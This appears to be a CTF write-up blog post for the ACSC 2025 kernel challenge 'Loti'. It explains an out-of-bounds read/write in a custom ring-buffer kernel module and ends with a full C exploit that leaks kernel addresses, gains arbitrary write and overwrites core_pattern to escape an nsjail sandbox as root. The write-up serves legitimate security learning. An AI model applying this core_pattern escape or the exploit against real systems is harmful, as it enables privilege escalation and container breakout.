@@ -1,0 +1,312 @@
+---
+layout: posts
+title:  "ACSC 2025 - Loti"
+subtitle: pwn
+date:   2025-12-01 02:00:00 +0200
+---
+*Having fun with kernel pwn and shared buffers and rigns*
+
+This challenge is from 2025's Austrian Cyber Security Challenge quals. I got hands on this challenge directly from the author Georg (crazy austrian pwner [0x6fe1be2](https://github.com/gfelber)) while preparing for Team Europe Quals back in may. I mamanged to solve it back then, but didn't found time to write down a writeup, so I'm doing it now 6 months later.
+
+
+# Challenge Overview 
+The challenge is classical linux kernel one - basic linux with custom kernel module. We are given the usual files as bzImage, rootfs.cpio.gz, run.sh, but Georg was so nice he packed his quick kernel ctf scripts and setup for running the challenges quickly. You can find the main structure here: [https://github.com/gfelber/how2keap](https://github.com/gfelber/how2keap)
+
+We have got a source code for the kernel module, so opening Ghidra is not needed at all. The module is relatively simple. It implements a ring functionality that processes commands via shared memory ring buffer,similar to linux's io_uring, but simplified.
+
+During initialization it allocates a struct ring_meta and a struct ring_buf. The ring_buf is allocated using vzalloc (vmalloc), while ring_meta is allocated using kzalloc(). It also starts a dedicated kernel thread ring_thread to process requests.
+
+The module implements also mmap which creates a shared memory between kernel and userspace for the ring buffer.
+
+Ring thread sits in a loop while checking submission queue based on sq->head and sq->tail. 
+It allows for 4 operations:
+
+- RING_OP_CREATE: Allocates a buffer (rmeta->data) of a user-specified size via kzalloc.
+
+- RING_OP_READ: Copies data from the kernel buffer rmeta->data to the shared output buffer.
+
+- RING_OP_WRITE: Copies data from the shared input buffer to the kernel buffer rmeta->data. Limited by size field.
+
+- RING_OP_DELETE: Frees the kernel buffer
+
+Note: This qemu uses nsjail, so we need to escape this aswell.
+
+## Vulnerability
+
+The vulnerability in the code is not that hard to spot, since the kernel module utilized shared memory the user controls this structure at all times. Since it also trusts the mask fields inside the shared memory structure ring_buf to determine the bounds of the ring buffer indices.
+```c
+sq->head = (sq->head + 1) & sq->mask;
+cq->tail = (cq->tail + 1) & cq->mask;
+```
+
+Since `sq` and `cq` are inside `rbuf` (mapped to user space), the attacker can modify `sq->mask` and `cq->mask`. By setting the mask to 0xFFFFFFFFFFFFFFFF, the bitwise AND operation effectively does nothing. This allows the attacker to increment `sq->head` or `cq->tail` to arbitrary values, causing the kernel to read/write submission_entry and completion_entry structures outside the bounds of the allocated buffer.
+
+# Exploitation
+
+Since `kaslr` is enabled first we need to obtain a leak. We can spray a bunch of ring_buf structs on the heap to get predictable heap sace and by modifying sq->head we can read to read pointers from adjacent struct, because the module always copies submission data to completion queue:
+```c
+cqe->user_data = sqe->user_data;
+```
+
+This allows to leak kernel base and page base of the current `ring_buf` struct. 
+One would think this is enough to use arbitrary write and read, but this OOB is not the cleanest for two reasons:
+
+1. OOB read only works for values at 0x28. The kernel is reading a 40-byte (0x28) structure from the raw memory of the kernel heap.
+```c    
+struct submission_entry {
+  __u32 op;           // 4 bytes
+  __u32 flags;        // 4 bytes
+  __u64 params[3];    // 24 bytes
+  __u64 user_data;    // 8 bytes  <-- THIS IS THE LEAK
+}; 
+
+```
+
+2. OOB write has similar problem allowing us to write only one qword separated by null bytes, which is not the best for writing strings. (Why strings? read further, tldr: core pattern) We could try to ROP from here, but this seemed too complex and we can find simpler way.
+```c
+struct completion_entry {
+    u64 user_data; // Controlled (8 bytes)
+    int rc;        // NOT Controlled (usually 0) (4 bytes)
+    u32 padding;   // Uninitialized/Padding (4 bytes)
+};
+```
+  
+## Trying to get flag, then leaking rmeta and getting flag
+At first I tried using only previous OOB write only to end up like this:
+
+![Loti discord](/assets/images/loti-discord.png)
+
+The other issue was escaping nsjail. Getting root shell isn't enough because we need to read flag from outside the namespace.
+
+However this is the same setup as they use in kCTF, so we can get our inspiration there.
+
+This submission [CVE-2024-36972](https://github.com/st424204/security-research/tree/fa3bed7298d85865bd1109fc278b982dc725cf28/pocs/linux/kernelctf/CVE-2024-36972_lts_cos) shows us a way to PrivEsc. It corrupts `/proc/sys/kernel/core_pattern` which is actually execute outside the sandbox to point to our binary through `/proc/%P/fd/666 %P` (note that the kernel replace %P with the PID of your binary)
+
+I tried doing that, but only to get into the OOB write null byte problem and since the string we need to write is bigger than 8 bytes and the linux does not allow null bytes in filenames I could not get anywhere. 
+
+At first I tried to bypass this by creating a new file with a script there to read flag, but the problem was to get to this file from root namespace, since it was created is nsjail's one. 
+
+I also had desperate try using `*`, to make the payload smaller, but this is just a bash thing so it won't work here. In bash you can use `/*/*/*.txt` and bash will resolve this to any file that has this structure `/AAA/BBB/CCC.txt`
+
+Since this does not work, let's find a better way.
+
+The module created thread stack for each thread of our spray and suprisingly it lies always at constant offset from the ring_buf. (At least in the same environment.) Only problem is that the allocated thread stack after ring buffer is not the thread stack of current ring_buf but different one and its not that hard to find.
+
+Using this offset to thread stack we can leak ring_meta pointer from this stack and using the same principle for OOB write to overwrite ring_meta size field to -1 allowing us to write more cleanly. 
+The RING_OP_WRITE is bound checked using this size therefore overwriting this allows us to get true ARB write.
+```c
+        if (sqe->params[2] > rmeta->size || sqe->params[0] > rmeta->size ||
+            (sqe->params[0] + sqe->params[2]) > rmeta->size ||
+            sqe->params[1] > rmeta->size ||
+            (sqe->params[1] + sqe->params[2]) > rmeta->size) {
+          cqe->rc = -EINVAL;
+          break;
+        }
+        memcpy(rmeta->data + sqe->params[0], rbuf->in_buf + sqe->params[1],
+               sqe->params[2]);
+```
+
+Using this we just calculate offset from the second `ring_buf` and get the flag.
+
+The only issue in remote vs local were the offsets to the thread stack, and Getting proper alignment with 0x28 read, but this could be easily bruteforce since the offsets did not change across even after rebooting the kernel.
+
+After solving the challenge Georg told me to look into BPF JIT Spray, quote "it is insanly powerfull and badly randomized, with big enough spary KASLR becomes predictable" and I still need to do it even 6 months after.
+
+Attaching official solution:
+
+![alt text](/assets/images/loti-discord-2.png)
+
+
+And my pwn.c
+```c
+#define _GNU_SOURCE
+#include "libs/pwn.h"
+#include <assert.h>
+#include <sched.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <pthread.h>
+#include <sys/prctl.h>
+
+
+#define CORE +0x00eb5480
+
+char *TARGET_CORE = "|/";
+
+int main(int argc, char *argv[])
+{
+  if (argc > 1)
+	{
+		// #define SYS_pidfd_getfd 438
+		int pid = strtoull(argv[1], 0, 10);
+		int pfd = syscall(SYS_pidfd_open, pid, 0);
+		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
+		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
+		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
+		dup2(stdinfd, 0);
+		dup2(stdoutfd, 1);
+		dup2(stderrfd, 2);
+		system("cat /flag");
+		execlp("bash", "bash", NULL);
+        return 0;
+  }
+  int memfd = memfd_create("", 0);
+  SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
+  dup2(memfd, 666);
+  close(memfd);
+  lstage("INIT");
+  rlimit_increase(RLIMIT_NOFILE);
+  pin_cpu(0, 0);
+
+
+  int ring_fds[50];
+  for (int i = 0; i < 50; i++)
+  {
+    ring_fds[i] = open("/dev/ring", O_RDWR);
+  }
+  int BUF_IDX = 5;// find on remote
+  int ring_fd2 = ring_fds[BUF_IDX]; 
+
+  struct ring_buf *rbuf2 = SYSCHK(mmap((void *)0xdeadbeef000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ring_fd2, 0));
+
+  ring_fd = ring_fds[0];
+  rbuf = SYSCHK(mmap((void *)0xdeadbeee000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ring_fd, 0));
+  struct submission_queue *sq = &rbuf->submission;
+  struct completion_queue *cq = &rbuf->completion;
+  char buf[0x2000] = {0};
+
+  sq->entries[sq->tail].op = RING_OP_CREATE;
+  sq->entries[sq->tail].params[0] = MAX_SIZE;
+  sq->entries[sq->tail].user_data = 0xdead0001;
+  sq->tail += 1;
+  while (cq->head == cq->tail)
+  {
+    usleep(1000);
+  }
+  linfo("CREATE returned %d", cq->entries[cq->head].rc);
+  sq->mask = 0xffffffffffffffff;
+  cq->mask = 0xffffffffffffffff;
+  struct submission_queue *sq2 = &rbuf2->submission;
+  struct completion_queue *cq2 = &rbuf2->completion;
+
+  sq->entries[sq->tail].op = -1;
+  sq->tail += 1;
+  sq->head = 0x2b9;
+  sq->tail = 0x2c4;
+
+  usleep(100000);
+  //print_hex((char *)rbuf + 0x1c0, 0x200);
+  long long kernel_base = *(long long *)((char *)rbuf + 0x1b0);
+  kernel_base = kernel_base - 0xb23e7;//- 0x3bde8;//- 0x6afe1d;// ;
+  long long page_base = *(long long *)((char *)rbuf + 0x1d0);
+  page_base = page_base - 0x6de8;
+  long long page_base2 = *(long long *)((char *)rbuf + 0x190);
+  page_base2 = page_base2;// + 0x632ba0;
+  long long stack_leak = *(long long *)((char *)rbuf + 0x1d0);
+  stack_leak = page_base +  0x159e60 + BUF_IDX * 0x5000 ;//- 0x8000; // change ringfd2 idx based on this
+  print_hex((char *)rbuf, 0x300);
+  printf("Kernel base: %llx\n", kernel_base);
+  printf("Page base: %llx\n", page_base);
+  printf("Page base2: %llx\n", page_base2);
+  printf("Stack leak: %llx\n", stack_leak);
+  //print_hex(rbuf, 0x200);
+  if (((long long)kernel_base & (long long)(0xffffffff000000ff)) != (long long)0xffffffff00000000){
+    puts("[-] Kernel base not found, exiting");
+    destructor();
+    return -1;
+  }  
+
+  uint64_t core_pattern = kernel_base + CORE;
+  linfo("Core pattern: %llx", core_pattern);
+  uint64_t offset = (stack_leak - page_base)/0x28;
+  linfo("Offset: %llx", offset);
+  
+  // prepare fake ring_meta->size
+  struct ring_meta *rmeta = (struct ring_meta *)((char *)rbuf+0x100);
+  rmeta->stop = 0;
+  rmeta->data = stack_leak;
+  rmeta->size = 0xffffffffffffffff;
+  rmeta->ring = page_base;
+  rmeta->thread = NULL;
+
+  cq->tail = 0;
+  sq->head = offset;
+  sq->tail = offset + 1;
+  usleep(100000);
+  long long rmeta_ptr = *(long long *)((char *)rbuf + 0x180);
+  linfo("Rmeta ptr: %p", rmeta_ptr);
+  lstage("Create second data buffer");
+
+  lstage("Overwriting ring_buf2 size fields");
+  sq2->mask = 0xffffffffffffffff;
+  cq2->mask = 0xffffffffffffffff;
+  sq2->head = 0;
+  sq2->tail = 0;
+  sq2->entries[sq2->tail].op = RING_OP_CREATE;
+  sq2->entries[sq2->tail].params[0] = MAX_SIZE;
+  sq2->entries[sq2->tail].params[1] = 0;
+  sq2->entries[sq2->tail].params[2] = 0;
+  sq2->entries[sq2->tail].user_data = 0xdead0003;
+  sq2->tail += 1;
+
+  usleep(1000000);
+  printf("Create returned %d\n", cq2->entries[cq2->tail].rc);
+  linfo("Created and alloced, overwriting the ring_meta size field...");
+  sq->tail = 0;
+  sq->head = 0;
+  offset = (rmeta_ptr + 0x10 - page_base - 0x180) / 0x10;
+  cq->tail = offset;
+  printf("Offset: %llx\n", offset);
+  
+  sq->entries[sq->tail].op = RING_OP_READ;
+  sq->entries[sq->tail].params[0] = 0;
+  sq->entries[sq->tail].params[1] = 0;
+  sq->entries[sq->tail].params[2] = 0;
+  sq->entries[sq->tail].user_data = 0xffffffffffffffff;
+  sq->tail += 1;
+  
+  usleep(1000000);
+  lstage("Writing payload to core pattern");
+  char *payload = "|/proc/%P/fd/666 %P";
+  memcpy(rbuf2->in_buf, payload, strlen(payload));
+  printf("Payload: %s\n", payload);
+  sq2->entries[sq2->tail].op = RING_OP_WRITE;
+  sq2->entries[sq2->tail].params[0] = 0;
+  sq2->entries[sq2->tail].params[1] = 0;
+  sq2->entries[sq2->tail].params[2] = strlen(payload);
+  sq2->entries[sq2->tail].user_data = 0xdead0004;
+  sq2->tail += 1;
+  
+  sleep(1);
+  printf("Write rc: %d\n", cq2->entries[cq2->tail].rc);
+  printf("Write id: %llx\n", cq2->entries[cq2->tail].user_data);
+
+  offset = (core_pattern-(page_base+0x8000*BUF_IDX+0x300)); // change this aswell 
+  printf("Core pattern offset: %llx\n", offset);
+  sq2->entries[sq2->tail].op = RING_OP_READ;
+  sq2->entries[sq2->tail].params[0] = offset;
+  sq2->entries[sq2->tail].params[1] = 0;
+  sq2->entries[sq2->tail].params[2] = strlen(payload);
+  sq2->entries[sq2->tail].user_data = 0xdead0005;
+  sq2->tail += 1;
+  
+  usleep(100000);
+  
+  printf("Write rc: %d\n", cq2->entries[cq2->tail].rc);
+  printf("rbuf2->out_buf: %s\n", rbuf2->out_buf);
+  system("cat /proc/sys/kernel/core_pattern");
+  if (SYSCHK(fork()) == 0) {
+    *(char *)0 = 1337;
+  }
+  sleep(3);
+  return 0;
+}
+
+```
